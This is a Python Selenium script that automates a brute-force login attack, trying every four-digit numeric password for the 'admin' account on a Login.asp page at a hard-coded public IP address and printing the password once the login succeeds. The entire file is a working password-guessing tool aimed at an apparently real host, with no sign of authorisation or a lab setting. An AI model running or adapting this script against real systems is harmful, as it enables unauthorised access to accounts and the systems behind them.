from selenium.webdriver.chrome.service import Service
from selenium import webdriver
from selenium.webdriver.common.by import By
from itertools import permutations, combinations, product

service = Service(executable_path="/usr/local/bin/chromedriver")
i = 0
lower_char_set = list("1234567890")


def convert_to_str(tupple):
    str = ''
    for i in tupple:
        str = str + i
    return str


with webdriver.Chrome(service=service) as driver:
    # navigate to the url
    driver.get('http://188.225.147.31/Login.asp')
    # find element by id
    for t in product(lower_char_set, repeat=4):
        if driver.current_url == "http://188.225.147.31/Login.asp":
            guess_string = convert_to_str(t)
            username_div = driver.find_element(By.ID, 'username')
            username_div.clear()
            username_div.send_keys("admin")
            myDiv = driver.find_element(By.ID, 'password')
            myDiv.clear()
            myDiv.send_keys(guess_string)
            driver.find_element(By.ID, 'loginBT').click()
            driver.switch_to.alert.accept()
            print(guess_string)

        else:
            print("the pass is ", guess_string)
            exit(0)
        # driver.get('https://localhost/index.html')
